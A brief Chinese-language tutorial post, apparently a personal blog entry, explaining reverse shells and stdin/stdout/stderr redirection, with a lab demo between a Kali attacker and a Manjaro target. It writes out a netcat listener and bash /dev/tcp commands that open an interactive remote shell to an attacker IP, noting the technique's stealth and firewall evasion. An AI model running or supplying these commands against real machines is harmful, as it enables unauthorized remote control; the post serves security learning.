---        
#    <center>反向shell</center>
反向shell就是让目标机器主动通过某一端口连接攻击机器，攻击端可以通过这一端口发送命令控制目标机器。通常用于防火墙受限，端口被占用等情形，反向shell可以让目标机器精准连接攻击端。

##    重定向
一个程序的运行一般涉及到输入，输出，错误。shell内部定义为标准输入，标准输出，标准错误，并用文件描述符0,1,2来表示它们。

正常情况下，输入来自键盘，输出和错误送到屏幕。重定向则是允许改变输入输出的流向。反向shell就是基于此，在目标机器发起连接到攻击端后，将所有的输出都定向到攻击端，大大增加了控制的隐蔽性。

##    bash 反向shell
攻击端kali, 目标段manjaro

kali 监听端口：
```
nc -lvp 3333
```
manjaro 系统执行:
```
bash -i > /dev/tcp/172.16.111.128/3333
```
![](https://i.loli.net/2019/10/24/Q9SlRqupBtJegZO.png)

终端的输出被定向到kali。现在只需要再把标准输入和标准错误定向同时定向到kali端。

manjaro 系统执行:
```
bash -i > /dev/tcp/172.16.111.128/3333 2>&1 0>&1
```
![](https://i.loli.net/2019/10/24/Z9eCKYWHRNLB8cQ.png)

此时输入输出都在kali端显示。




 2019-10-13 13:51:02
 
---           